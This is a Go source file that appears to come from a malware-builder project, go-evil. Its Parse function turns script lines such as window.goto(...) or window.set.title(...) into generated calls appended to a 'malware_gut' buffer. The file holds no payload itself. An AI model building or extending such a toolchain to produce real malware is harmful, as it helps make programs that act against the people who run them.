package window

import (
	"fmt"
	"regexp"

	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/error"
	"github.com/s9rA16Bf4/go-evil/utility/json"
)

const (
	EXTRACT_SUBDOMAIN = "(window)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION  = "(window)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)

	data_structure.Append_to_call("window.Parse()")

	for _, line := range data_structure.File_gut {
		value := contains.Passed_value(line)

		regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
		result := regex.FindAllStringSubmatch(line, -1)

		if len(result) > 0 { // There is a subdomain to extract
			subdomain := result[0][2]
			function := result[0][3]
			switch subdomain {
			case "set":
				switch function {
				case "x":
					data_structure.Append_malware_gut(fmt.Sprintf("win.SetX(\"%s\")", value))
				case "y":
					data_structure.Append_malware_gut(fmt.Sprintf("win.SetY(\"%s\")", value))
				case "title":
					data_structure.Append_malware_gut(fmt.Sprintf("win.SetTitle(\"%s\")", value))
				default:
					error.Function_error(function, "window.Parse()")
				}
			case "display":
				switch function {
				case "file":
					data_structure.Append_malware_gut(fmt.Sprintf("win.DisplayFile(\"%s\")", value))
				default:
					error.Function_error(function, "window.Parse()")
				}
			default:
				error.Subdomain_error(subdomain, "window.Parse()")
			}
		} else { // There might be a function which doesn't require a subdomain to work
			regex = regexp.MustCompile(EXTRACT_FUNCTION)
			result = regex.FindAllStringSubmatch(line, -1)
			if len(result) > 0 {
				function := result[0][2]
				switch function {
				case "goto":
					data_structure.Append_malware_gut(fmt.Sprintf("win.GoToUrl(\"%s\")", value))
				case "display":
					data_structure.Append_malware_gut(fmt.Sprintf("win.Display(\"%s\")", value))
				default:
					error.Function_error(function, "window.Parse()")
				}
			}
		}
	}
	return json.Send(data_structure)
}
